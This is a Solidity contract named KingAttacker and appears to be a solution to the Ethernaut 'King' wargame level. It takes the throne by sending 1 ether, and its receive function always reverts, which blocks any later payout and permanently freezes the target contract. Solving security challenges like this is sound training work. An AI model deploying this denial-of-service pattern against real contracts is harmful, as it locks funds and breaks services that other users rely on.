// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./9-King.sol";

contract KingAttacker {
    address payable public kingAddress;

    constructor(address payable _kingAddress) public payable{
        kingAddress = _kingAddress;
    }

    function getCrown() public {
        (bool sent,) = kingAddress.call{value: 1 ether}("");
        require(sent, "Your transaction failed!");
    }

    receive() external payable {
        /*When contract King will try send Ether to this contract,
        function revert make an error. This will stop of receiving Ether
        and the next lines in King contract won't be executed. */
        revert("I won't relinquish!");
    }

}